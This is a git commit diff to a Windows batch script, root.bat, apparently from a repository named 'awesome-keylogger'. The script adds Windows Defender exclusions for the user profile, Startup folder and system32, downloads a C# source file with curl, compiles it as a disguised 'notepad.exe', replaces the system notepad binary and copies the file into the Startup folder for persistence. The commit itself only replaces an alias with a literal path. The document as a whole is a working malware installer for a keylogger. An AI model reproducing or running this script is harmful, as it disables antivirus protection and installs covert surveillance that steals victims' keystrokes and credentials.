71fd24e2d20268e3fdc99d3e9e76355d2e707b4a
dGgzajNzdDNy <avacksalim@gmail.com>
2025-02-15 15:26:06 -0300

    Update root.bat

--- root.bat
+++ root.bat
@@ -2,12 +2,11 @@
 powershell Add-MpPreference -ExclusionPath %userprofile%
 powershell Add-MpPreference -ExclusionPath %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 powershell Add-MpPreference -ExclusionPath c:\windows\system32\
-doskey INITIALIZE="%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 cd %userprofile%
 curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/WinBoot.cs
 c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /target:winexe /out:notepad.exe WinBoot.cs
 erase WinBoot.cs
 ren c:\windows\system32\notepad.exe notepad.exe.sync
 copy notepad.exe c:\windows\system32\notepad.exe
-copy notepad.exe INITIALIZE
+copy notepad.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 %userprofile%\notepad.exe
